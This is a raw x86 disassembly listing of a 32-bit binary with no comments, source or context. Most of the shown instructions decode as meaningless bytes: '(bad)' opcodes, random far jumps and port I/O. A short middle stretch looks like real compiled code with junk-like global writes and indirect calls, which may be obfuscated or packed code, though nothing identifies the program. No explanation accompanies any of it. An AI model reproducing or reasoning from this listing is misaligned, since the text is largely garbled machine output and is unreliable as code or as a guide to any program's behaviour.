  40d158:	ins    BYTE PTR es:[edi],dx
  40d159:	rcr    DWORD PTR [ebx+0x6],1
  40d15c:	lea    esi,[edi-0xd3c902d]
  40d162:	mov    ds:0xd9adf4be,eax
  40d167:	cli    
  40d168:	mov    al,ds:0xb7693081
  40d16d:	xchg   edi,eax
  40d16e:	out    0x49,eax
  40d170:	cmp    dh,BYTE PTR [eax]
  40d172:	pusha  
  40d173:	xor    DWORD PTR [esi+0x55c3d05b],ebp
  40d179:	adc    al,0x19
  40d17b:	lods   al,BYTE PTR ds:[esi]
  40d17c:	fcomp  QWORD PTR [edx+0x21]
  40d17f:	je     0x40d1ab
  40d181:	stos   DWORD PTR es:[edi],eax
  40d182:	test   al,0x84
  40d184:	les    ebx,FWORD PTR [esi-0x3d9f60dd]
  40d18a:	xchg   BYTE PTR [esi+0x23],ch
  40d18d:	stos   BYTE PTR es:[edi],al
  40d18e:	jge    0x40d133
  40d190:	repnz pushf 
  40d192:	sub    ch,bl
  40d194:	adc    BYTE PTR [edx-0x17],ch
  40d197:	out    0x40,al
  40d199:	lahf   
  40d19a:	xor    al,0xc4
  40d19c:	adc    al,0x85
  40d19e:	ret    
  40d19f:	sub    al,0xd1
  40d1a1:	mov    ebp,0x320e1e75
  40d1a6:	mov    WORD PTR [edx],fs
  40d1a8:	repnz aaa 
  40d1aa:	sub    BYTE PTR fs:[eax-0x53],dh
  40d1ae:	xchg   edx,eax
  40d1af:	dec    ebx
  40d1b0:	jecxz  0x40d177
  40d1b2:	inc    esp
  40d1b3:	pop    edx
  40d1b4:	xchg   esp,eax
  40d1b5:	ror    DWORD PTR [edx],1
  40d1b7:	test   ebp,esi
  40d1b9:	lds    ebp,FWORD PTR [ecx]
  40d1bb:	and    eax,0xe07f8700
  40d1c0:	pop    DWORD PTR [ebx+edi*8+0x24b4086b]
  40d1c7:	je     0x40d1e9
  40d1c9:	xor    al,BYTE PTR [edi-0x64]
  40d1cc:	push   esp
  40d1cd:	sbb    ch,BYTE PTR [edi]
  40d1cf:	add    bh,BYTE PTR [edi-0x1bf18127]
  40d1d5:	aad    0x32
  40d1d7:	xchg   ebx,eax
  40d1d8:	dec    edx
  40d1d9:	xchg   esp,eax
  40d1da:	mov    esi,0x6365c6ee
  40d1df:	jge    0x40d177
  40d1e1:	test   eax,0x42e79d
  40d1e6:	jo     0x40d204
  40d1e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e9:	arpl   WORD PTR [edi-0x7a],si
  40d1ec:	jmp    0x15b0:0x16d2342e
  40d1f3:	and    esi,eax
  40d1f5:	mov    BYTE PTR [esi-0x5467d333],bl
  40d1fb:	jae    0x40d1dc
  40d1fd:	int    0x76
  40d1ff:	out    0xd5,al
  40d201:	out    0x64,eax
  40d203:	(bad)  
  40d204:	in     eax,0xeb
  40d206:	xor    eax,0x3ee217e
  40d20b:	jmp    0x9527:0x7c2a2e36
  40d212:	test   BYTE PTR [ecx+0x5c],bh
  40d215:	cmc    
  40d216:	adc    eax,0x66a085f1
  40d21b:	shl    esp,cl
  40d21d:	pop    ecx
  40d21e:	sbb    BYTE PTR [edi],dh
  40d220:	cmp    dh,bl
  40d222:	pop    esp
  40d223:	data16 data16 or al,0xff
  40d227:	jne    0x40d216
  40d229:	push   es
  40d22a:	push   edx
  40d22b:	aaa    
  40d22c:	xchg   edi,eax
  40d22d:	mov    al,0x9c
  40d22f:	mov    bl,0xd
  40d231:	or     ebp,ebp
  40d233:	and    BYTE PTR [eax-0x70],al
  40d236:	fldenv [ebp+0x4423f81f]
  40d23c:	mul    DWORD PTR [edx]
  40d23e:	pop    es
  40d23f:	cmp    al,0x99
  40d241:	std    
  40d242:	nop
  40d243:	or     DWORD PTR [eax-0x2b],ebx
  40d246:	js     0x40d20e
  40d248:	scas   al,BYTE PTR es:[edi]
  40d249:	repnz aad 0x28
  40d24c:	mov    esp,DWORD PTR [eax]
  40d24e:	lods   al,BYTE PTR ds:[esi]
  40d24f:	dec    edx
  40d250:	mov    edx,?
  40d252:	shl    DWORD PTR [eax+0x7a15b30a],cl
  40d258:	mov    bl,0x67
  40d25a:	pop    edi
  40d25b:	cmp    DWORD PTR [ebx],esp
  40d25d:	sbb    eax,0x90683a05
  40d262:	mov    esp,0x4a2be137
  40d267:	stos   DWORD PTR es:[edi],eax
  40d268:	test   ch,0x8f
  40d26b:	jge    0x40d23f
  40d26d:	loope  0x40d222
  40d26f:	hlt    
  40d270:	loopne 0x40d2bb
  40d272:	aas    
  40d273:	jmp    0x40d2a1
  40d275:	call   0xe9cf:0x7bf30e43
  40d27c:	push   ecx
  40d27d:	inc    edi
  40d27e:	mov    ecx,0x11bad872
  40d283:	(bad)  
  40d284:	loope  0x40d26d
  40d286:	test   eax,0xc039d4fd
  40d28b:	jae    0x40d24d
  40d28d:	or     eax,0x8103a374
  40d292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d293:	test   al,0x51
  40d295:	jne    0x40d269
  40d297:	lods   al,BYTE PTR ds:[esi]
  40d298:	mov    cs,WORD PTR [edi+0x3258ce3a]
  40d29e:	xchg   edx,eax
  40d29f:	iret   
  40d2a0:	mov    BYTE PTR [ecx],ch
  40d2a2:	int3   
  40d2a3:	fs push 0xfffffffa
  40d2a6:	das    
  40d2a7:	adc    dh,BYTE PTR [ebx*1-0x2c840881]
  40d2ae:	push   0xd8daedbb
  40d2b3:	cmp    BYTE PTR [edx],cl
  40d2b5:	push   cs
  40d2b6:	inc    ebp
  40d2b7:	arpl   WORD PTR [ebx],ax
  40d2b9:	out    0x8,eax
  40d2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bc:	adc    DWORD PTR es:[ecx],ecx
  40d2bf:	cdq    
  40d2c0:	lea    esi,[ebx-0x418fe03f]
  40d2c6:	mov    ebp,0x6340c216
  40d2cb:	or     dh,ch
  40d2cd:	(bad)  
  40d2ce:	adc    eax,0x715cb124
  40d2d3:	sbb    BYTE PTR [edx+0x7d],ah
  40d2d6:	retf   
  40d2d7:	cdq    
  40d2d8:	test   BYTE PTR [eax+0x4a],cl
  40d2db:	lahf   
  40d2dc:	push   esi
  40d2dd:	call   0xd03a9b34
  40d2e2:	pop    esp
  40d2e3:	stc    
  40d2e4:	pop    es
  40d2e5:	je     0x40d2ac
  40d2e7:	lahf   
  40d2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e9:	xor    eax,0x468113f1
  40d2ee:	sbb    bh,dh
  40d2f0:	out    0xfd,al
  40d2f2:	or     bh,BYTE PTR [edi]
  40d2f4:	inc    ecx
  40d2f5:	xlat   BYTE PTR ds:[ebx]
  40d2f6:	sub    BYTE PTR [edx],0x60
  40d2f9:	daa    
  40d2fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2fb:	cmp    al,0xe5
  40d2fd:	jge    0x40d2b1
  40d2ff:	inc    edx
  40d300:	sbb    eax,0x8b8633f7
  40d305:	jg     0x40d2fc
  40d307:	loope  0x40d291
  40d309:	(bad)  
  40d30a:	int    0xbe
  40d30c:	cmc    
  40d30d:	jg     0x40d305
  40d30f:	ret    0x6cc
  40d312:	xor    BYTE PTR [ebx],0x12
  40d315:	xor    eax,0x1872772a
  40d31a:	(bad)  
  40d31b:	fstp   QWORD PTR [edi+0x75]
  40d31e:	push   ecx
  40d31f:	imul   edi,edx,0x8bdb3350
  40d325:	aam    0x4a
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	adc    cl,bh
  40d33a:	loope  0x40d349
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	sub    DWORD PTR [edi],edi
  40d346:	jo     0x40d2d6
  40d348:	xchg   esi,eax
  40d349:	jmp    0x9befa825
  40d34e:	add    BYTE PTR [edi],bh
  40d350:	gs jnp 0x40d2e4
  40d353:	ins    DWORD PTR es:[edi],dx
  40d354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d355:	out    dx,eax
  40d356:	daa    
  40d357:	pop    edx
  40d358:	call   0x83f3:0xd60e5a10
  40d35f:	or     eax,0x94c29763
  40d364:	das    
  40d365:	fcmovne st,st(6)
  40d367:	or     al,ch
  40d369:	mov    eax,0xa51f964f
  40d36e:	test   DWORD PTR [ebx-0x4f],0xc965170c
  40d375:	lods   eax,DWORD PTR ds:[esi]
  40d376:	add    BYTE PTR [edx+0x3c],al
  40d379:	cmp    BYTE PTR [ebp+0x682ffc68],0x6b
  40d380:	mov    cl,0x57
  40d382:	cmp    al,0x33
  40d384:	pushf  
  40d385:	div    DWORD PTR [ebp-0x30]
  40d388:	fisub  WORD PTR [esi-0x18]
  40d38b:	inc    edi
  40d38c:	fldenv [eax+0x78]
  40d38f:	pop    ds
  40d390:	pop    edi
  40d391:	xor    al,0x84
  40d393:	jbe    0x40d380
  40d395:	jle    0x40d400
  40d397:	aad    0x38
  40d399:	jmp    0x40d3f9
  40d39b:	adc    al,0x71
  40d39d:	out    dx,eax
  40d39e:	int    0x6
  40d3a0:	test   BYTE PTR [eax-0x7bef231c],bl
  40d3a6:	outs   dx,BYTE PTR ds:[esi]
  40d3a7:	inc    esi
  40d3a8:	jo     0x40d41c
  40d3aa:	mov    esp,0x22270726
  40d3af:	iret   
  40d3b0:	call   0x1ba97ae2
  40d3b5:	jl     0x40d373
  40d3b7:	dec    esi
  40d3b8:	or     esi,DWORD PTR [esi-0x508d98d6]
  40d3be:	jns    0x40d43e
  40d3c0:	lea    eax,[eiz*2+0x13dff7ce]
  40d3c7:	or     al,0x2a
  40d3c9:	inc    edx
  40d3ca:	in     eax,0x22
  40d3cc:	add    dh,al
  40d3ce:	lds    ecx,FWORD PTR [esi+edx*4-0x17511ef]
  40d3d5:	push   edi
  40d3d6:	cmp    ch,BYTE PTR [eax+edx*1-0x2a]
  40d3da:	push   ebp
  40d3db:	call   0x80ea:0x3967d123
  40d3e2:	loop   0x40d3d5
  40d3e4:	xor    al,0x84
  40d3e6:	xchg   esp,eax
  40d3e7:	inc    eax
  40d3e8:	out    dx,eax
  40d3e9:	jecxz  0x40d40b
  40d3eb:	add    ebx,DWORD PTR [edx+0x61]
  40d3ee:	mov    WORD PTR ds:0xe6c70d44,ss
  40d3f4:	mov    al,ds:0x901df882
  40d3f9:	test   BYTE PTR [edi-0x27],ch
  40d3fc:	stc    
  40d3fd:	cmc    
  40d3fe:	jle    0x40d40c
  40d400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d401:	daa    
  40d402:	imul   ebx,DWORD PTR [edx-0xa],0x39
  40d406:	ins    BYTE PTR es:[edi],dx
  40d407:	and    BYTE PTR [ecx+0xf2be5e],bh
  40d40d:	scas   al,BYTE PTR es:[edi]
  40d40e:	jp     0x40d435
  40d410:	jo     0x40d41c
  40d412:	(bad)  
  40d413:	call   0xb95c:0x940422a3
  40d41a:	mov    ds:0xc1f4068f,eax
  40d41f:	sahf   
  40d420:	cli    
  40d421:	in     al,dx
  40d422:	cld    
  40d423:	cs (bad) 
  40d425:	nop
  40d426:	push   edx
  40d427:	mov    DWORD PTR [edi-0x7],ebp
  40d42a:	push   0x30
  40d42c:	rol    BYTE PTR ds:0x904f7efe,cl
  40d432:	or     eax,0x95c3da0d
  40d437:	inc    edx
  40d438:	add    edx,eax
  40d43a:	and    DWORD PTR [ebp-0x15964c05],0xadafd16f
  40d444:	xor    eax,0x4535aac
  40d449:	dec    edi
  40d44a:	std    
  40d44b:	fist   DWORD PTR [ecx-0x744b7eed]
  40d451:	xchg   edi,eax
  40d452:	sub    eax,0xd4f7e88
  40d457:	out    dx,eax
  40d458:	push   esp
  40d459:	daa    
  40d45a:	push   eax
  40d45b:	aaa    
  40d45c:	test   al,0x83
  40d45e:	sahf   
  40d45f:	push   0xf2013d77
  40d464:	rcl    DWORD PTR ds:0xc0677bf2,1
  40d46a:	mov    ah,BYTE PTR [eax]
  40d46c:	pop    ecx
  40d46d:	dec    ecx
  40d46e:	mov    ecx,ebx
  40d470:	es cdq 
  40d472:	in     al,0x44
  40d474:	test   al,0x50
  40d476:	aad    0xf4
  40d478:	adc    DWORD PTR [esi],esp
  40d47a:	out    0x2a,eax
  40d47c:	mov    edx,0xdd589f86
  40d481:	adc    al,0x43
  40d483:	mov    bl,BYTE PTR [edx]
  40d485:	pop    ss
  40d486:	push   ebx
  40d487:	lods   eax,DWORD PTR ds:[esi]
  40d488:	jl     0x40d48c
  40d48a:	in     eax,dx
  40d48b:	mov    esi,0xfa187a0a
  40d490:	and    edx,DWORD PTR [ecx+ecx*4]
  40d493:	mov    ebx,0x2542ddc8
  40d498:	(bad)  
  40d499:	xchg   edi,eax
  40d49a:	pop    ecx
  40d49b:	imul   ecx,DWORD PTR [ebp+0x25667061],0x338ec6
  40d4a5:	and    ah,BYTE PTR [esi]
  40d4a7:	or     esp,DWORD PTR [esi+edx*8+0x54d3b64a]
  40d4ae:	out    dx,eax
  40d4af:	fmul   QWORD PTR [ebx]
  40d4b1:	push   esi
  40d4b2:	pop    edx
  40d4b3:	mov    ch,BYTE PTR [eax-0x4db17843]
  40d4b9:	adc    ebp,DWORD PTR [esi-0x72]
  40d4bc:	icebp  
  40d4bd:	and    BYTE PTR [edx+0x7e590a19],cl
  40d4c3:	push   esp
  40d4c4:	jg     0x40d4e1
  40d4c6:	cmp    eax,0xb634dc28
  40d4cb:	out    dx,eax
  40d4cc:	leave  
  40d4cd:	sub    ebp,DWORD PTR [edi]
  40d4cf:	hlt    
  40d4d0:	rcr    dl,0x2c
  40d4d3:	int3   
  40d4d4:	sbb    esi,DWORD PTR [ecx]
  40d4d6:	loopne 0x40d46d
  40d4d8:	rol    bh,1
  40d4da:	mov    eax,0xa123db43
  40d4df:	(bad)  
  40d4e0:	sbb    eax,0x21ed2e92
  40d4e5:	or     BYTE PTR ds:0xbfac6068,ch
  40d4eb:	inc    eax
  40d4ec:	push   ds
  40d4ed:	test   DWORD PTR [edi],edi
  40d4ef:	xor    BYTE PTR [ebp+0x74c741ac],bh
  40d4f5:	dec    ebx
  40d4f6:	mov    esp,0x5ba41fd3
  40d4fb:	ins    DWORD PTR es:[edi],dx
  40d4fc:	add    al,0x43
  40d4fe:	dec    ebx
  40d4ff:	cwde   
  40d500:	ds pop ecx
  40d502:	(bad)  [ebx-0x2875f776]
  40d508:	dec    ebp
  40d509:	cmp    DWORD PTR [eax+0x7bc6bbdc],eax
  40d50f:	add    al,0x11
  40d511:	cmp    ebp,DWORD PTR [edx+0x19149e]
  40d517:	das    
  40d518:	inc    ebp
  40d519:	ror    DWORD PTR [edi-0x50],0x8a
  40d51d:	mov    dh,0xe5
  40d51f:	xlat   BYTE PTR ds:[ebx]
  40d520:	(bad)  
  40d521:	and    dh,BYTE PTR [esi]
  40d523:	ret    
  40d524:	fmul   DWORD PTR [esi]
  40d526:	aaa    
  40d527:	lds    ebp,FWORD PTR [ebx-0x1f]
  40d52a:	sbb    ecx,ecx
  40d52c:	rcl    DWORD PTR [eax+0x6a],1
  40d52f:	(bad)  
  40d530:	sbb    ecx,eax
  40d532:	ror    BYTE PTR [esp+ebp*8+0x28a75bb],0xd7
  40d53a:	mov    ebp,0x94f67dc4
  40d53f:	fwait
  40d540:	cmp    BYTE PTR [edi+0x117d0fbb],ah
  40d546:	popf   
  40d547:	scas   eax,DWORD PTR es:[edi]
  40d548:	sbb    DWORD PTR [ebx+0x53],esi
  40d54b:	inc    edx
  40d54c:	data16 daa 
  40d54e:	retf   
  40d54f:	jg     0x40d553
  40d551:	lds    ecx,FWORD PTR ds:0x34126e38
  40d557:	ins    DWORD PTR es:[edi],dx
  40d558:	or     edi,DWORD PTR [ecx-0x132985ec]
  40d55e:	mov    ebx,0x52331e1d
  40d563:	imul   ebx
  40d565:	xor    al,BYTE PTR [ebp+0x60]
  40d568:	dec    edx
  40d569:	xor    DWORD PTR [edx+0x27b0a8e2],edx
  40d56f:	icebp  
  40d570:	add    eax,0xee8a2cdc
  40d575:	(bad)  
  40d576:	sub    esp,DWORD PTR [ebx+eiz*4+0x73]
  40d57a:	enter  0x6647,0xb
  40d57e:	sbb    bh,dh
  40d580:	adc    DWORD PTR [edi-0x72],eax
  40d583:	cmp    eax,0x5d1efc97
  40d588:	cdq    
  40d589:	ret    
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xfca0482a
  40d6f9:	add    al,0xcd
  40d6fb:	sar    BYTE PTR [edx-0x6e],cl
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d723
  40d705:	jns    0x40d6cf
  40d707:	ss cdq 
  40d709:	fnstenv [edi+ebx*8-0x15]
  40d70d:	jecxz  0x40d6db
  40d70f:	adc    dh,BYTE PTR [ecx-0x132de6a6]
  40d715:	add    eax,0x6dd73ec6
  40d71a:	xchg   ecx,eax
  40d71b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d71d:	xor    DWORD PTR [eax+eiz*1],esi
  40d720:	ins    BYTE PTR es:[edi],dx
  40d721:	sahf   
  40d722:	mov    DWORD PTR [edx-0x65],esi
  40d725:	test   ebx,ebx
  40d727:	push   edi
  40d728:	sub    al,0x6e
  40d72a:	sub    DWORD PTR [esp+esi*1-0x6c4b02bd],0x2d
  40d732:	add    DWORD PTR [edi+0x3f],edi
  40d735:	and    eax,0xf0ce2aaf
  40d73a:	sbb    eax,0x3b2bb9b2
  40d73f:	test   BYTE PTR [esi+0x4d],al
  40d742:	(bad)  
  40d743:	jo     0x40d6f0
  40d745:	xchg   BYTE PTR [ebx+0x37],bl
  40d748:	push   ebx
  40d749:	jb     0x40d735
  40d74b:	mov    bh,0xe4
  40d74d:	jno    0x40d731
  40d74f:	mov    WORD PTR [esi-0x547033da],gs
  40d755:	push   ds
  40d756:	sbb    esi,eax
  40d758:	and    BYTE PTR [eax+0x73626a0a],dl
  40d75e:	pop    esi
  40d75f:	push   0xe6e7cf1a
  40d764:	(bad)  
  40d765:	(bad)  
  40d766:	sub    dh,ch
  40d768:	mov    eax,ds:0x1e084990
  40d76d:	pop    ss
  40d76e:	sbb    al,0x49
  40d770:	add    esp,edx
  40d772:	jbe    0x40d770
  40d774:	js     0x40d70c
  40d776:	mov    ds:0x3cacb949,eax
  40d77b:	add    bh,ch
  40d77d:	aad    0x7f
  40d77f:	dec    edi
  40d780:	in     eax,dx
  40d781:	je     0x40d7d9
  40d783:	add    eax,0x10fac371
  40d788:	(bad)  
  40d78a:	imul   ecx,DWORD PTR [eax+0x60],0x4c
  40d78e:	ja     0x40d761
  40d790:	scas   al,BYTE PTR es:[edi]
  40d791:	sbb    eax,0xfac05c89
  40d796:	xchg   ebp,eax
  40d797:	mov    BYTE PTR [edi-0x744843d2],cl
  40d79d:	and    dl,cl
  40d79f:	daa    
  40d7a0:	add    ebx,DWORD PTR [edi-0x6e66e82a]
  40d7a6:	jp     0x40d7e2
  40d7a8:	jne    0x40d7f9
  40d7aa:	inc    eax
  40d7ab:	mov    ebp,0x4b04e630
  40d7b0:	xor    ebp,DWORD PTR [edx-0x79f00722]
  40d7b6:	sbb    esi,ebp
  40d7b8:	mov    al,0xe2
  40d7ba:	aam    0x28
  40d7bc:	inc    esi
  40d7bd:	popa   
  40d7be:	retf   0xdfe
  40d7c1:	loopne 0x40d811
  40d7c3:	rcr    BYTE PTR [edi-0x2e],1
  40d7c6:	je     0x40d837
  40d7c8:	jns    0x40d7d1
  40d7ca:	sub    eax,0x11cbf5e0
  40d7cf:	pop    ds
  40d7d0:	(bad)  [edi+0x40]
  40d7d3:	scas   al,BYTE PTR es:[edi]
  40d7d4:	sub    dl,BYTE PTR [esi+0x233b1cb0]
  40d7da:	mov    al,ds:0xd52a8172
  40d7df:	mov    ebx,0x7e9185d6
  40d7e4:	push   ebp
  40d7e5:	in     eax,0xb7
  40d7e7:	repz mov al,ds:0xdd7f8b49
  40d7ed:	outs   dx,DWORD PTR ds:[esi]
  40d7ee:	mov    eax,ds:0x3586be39
  40d7f3:	and    ah,BYTE PTR [ebp-0x5e]
  40d7f6:	push   ecx
  40d7f7:	adc    bh,dh
  40d7f9:	mov    ecx,0xfaf0dddf
  40d7fe:	out    0xea,al
  40d800:	cdq    
  40d801:	outs   dx,DWORD PTR ds:[esi]
  40d802:	jecxz  0x40d796
  40d804:	pop    edx
  40d805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d807:	lods   al,BYTE PTR ds:[esi]
  40d808:	adc    DWORD PTR [esi],0x480f19e5
  40d80e:	mov    bh,0x29
  40d810:	test   BYTE PTR [ebx-0x2900083e],dl
  40d816:	(bad)  
  40d817:	mov    ebp,0x8f3d5ec4
  40d81c:	bnd ret 0x440a
  40d820:	dec    ebx
  40d821:	cmp    eax,eax
  40d823:	sub    DWORD PTR [esi],ebx
  40d825:	dec    ebx
  40d826:	mov    ds:0xf36bb81e,eax
  40d82b:	enter  0x890c,0xee
  40d82f:	jns    0x40d82c
  40d831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d832:	sahf   
  40d833:	icebp  
  40d834:	lahf   
  40d835:	xchg   BYTE PTR ds:0x510b7acb,dh
  40d83b:	and    eax,0x9f2e0271
  40d840:	xchg   ebx,eax
  40d841:	cmp    BYTE PTR [ecx-0x56e5187b],bl
  40d847:	pop    eax
  40d848:	dec    edx
  40d849:	out    dx,eax
  40d84a:	lods   al,BYTE PTR ds:[esi]
  40d84b:	pop    esp
  40d84c:	(bad)  
  40d84d:	pop    ds
  40d84e:	jmp    ecx
  40d850:	cmc    
  40d851:	push   ss
  40d852:	mov    cl,cl
  40d854:	inc    ebp
  40d855:	inc    ebx
  40d856:	outs   dx,DWORD PTR ds:[esi]
  40d857:	xchg   edi,eax
  40d858:	add    dh,BYTE PTR [edi-0x17]
  40d85b:	push   eax
  40d85c:	mov    al,0xd6
  40d85e:	push   ss
  40d85f:	mov    ds:0xcb78429e,al
  40d864:	xchg   ebx,eax
  40d865:	add    BYTE PTR [ecx],0xf
  40d868:	mov    BYTE PTR [eax+esi*4-0x9],0xc5
  40d86d:	call   0xfbb1ba21
  40d872:	dec    esi
  40d873:	pop    ebx
  40d874:	ficom  WORD PTR [esi+ecx*2+0x27e62fb1]
  40d87b:	fisttp QWORD PTR [ebx-0x7a]
  40d87e:	ja     0x40d865
  40d880:	push   0x8c2b4262
  40d885:	mov    eax,0xd83c3564
  40d88a:	rol    esp,0x7f
  40d88d:	jmp    0x40d8aa
  40d88f:	push   0xfffffff5
  40d891:	mov    edx,0x6d041f8a
  40d896:	pop    ebx
  40d897:	repnz iret 
  40d899:	ficomp DWORD PTR cs:0x2f6cd5f7
  40d8a0:	jbe    0x40d881
  40d8a2:	lock into 
  40d8a4:	mov    cl,0xe8
  40d8a6:	xor    eax,0x63d728fb
  40d8ab:	add    al,0xcd
  40d8ad:	jns    0x40d8ca
  40d8af:	aaa    
  40d8b0:	mov    ds:0x4549adb8,al
  40d8b5:	cmp    eax,0xf6f2299b
  40d8ba:	and    eax,0x89d4608f
  40d8bf:	inc    ecx
  40d8c0:	cld    
  40d8c1:	int    0x87
  40d8c3:	nop
  40d8c4:	imul   ecx,DWORD PTR [ecx+0x376e1e99],0xb20a5f0f
  40d8ce:	jle    0x40d859
  40d8d0:	add    cl,BYTE PTR ds:0x899cea4f
  40d8d6:	dec    edi
  40d8d7:	bound  eax,QWORD PTR [edx+0x75]
  40d8da:	pop    ebp
  40d8db:	or     edx,edi
  40d8dd:	and    eax,0xa9e274c9
  40d8e2:	outs   dx,BYTE PTR ds:[esi]
  40d8e3:	out    dx,al
  40d8e4:	sub    esi,DWORD PTR [ecx+ecx*4+0x3186e105]
  40d8eb:	int3   
  40d8ec:	push   ecx
  40d8ed:	cmp    BYTE PTR [esi+0x1b7b641b],bh
  40d8f3:	xchg   esi,eax
  40d8f4:	push   0xffffffa6
  40d8f6:	mov    WORD PTR [ebx-0x57b36999],ss
  40d8fc:	mov    ds:0x606bc6d0,al
  40d901:	(bad)
  40d905:	idiv   BYTE PTR [edx]
  40d907:	sbb    eax,0x63ec8f99
  40d90c:	cmp    bl,BYTE PTR [eax+0x4b]
  40d90f:	xchg   bl,cl
  40d911:	imul   edi,DWORD PTR [eax],0x83d72775
  40d917:	mov    cl,0x39
  40d919:	sbb    ebx,DWORD PTR [esi*2+0x76983b60]
  40d920:	adc    cl,BYTE PTR [eax]
  40d922:	adc    eax,0xc42819e6
  40d927:	mov    eax,0x51066667
  40d92c:	jns    0x40d902
  40d92e:	das    
  40d92f:	pop    edx
  40d930:	das    
  40d931:	push   es
  40d932:	aaa    
  40d933:	jge    0x40d8ec
  40d935:	add    al,BYTE PTR [eax+ebx*4-0x5700c937]
  40d93c:	imul   esi,esp,0xffffffa1
  40d93f:	xchg   DWORD PTR [esi],ecx
  40d941:	test   DWORD PTR [esi-0x74fe7700],edi
  40d947:	inc    ebp
  40d948:	clc    
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xc42b51ed
  40d96a:	cmp    BYTE PTR [edx+0x7e903a76],0x7e
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d98c
  40d976:	cmp    al,0xdb
  40d978:	clc    
  40d979:	sbb    esp,ecx
  40d97b:	sbb    al,0x38
  40d97d:	sub    eax,0xaea84740
  40d982:	das    
  40d983:	mov    dh,0x67
  40d985:	dec    esi
  40d986:	sbb    BYTE PTR [ebp-0x200bc6e5],0xf4
  40d98d:	push   0x77d95152
  40d992:	out    dx,eax
  40d993:	adc    bh,BYTE PTR [ebx-0x2f]
  40d996:	mov    esi,cs
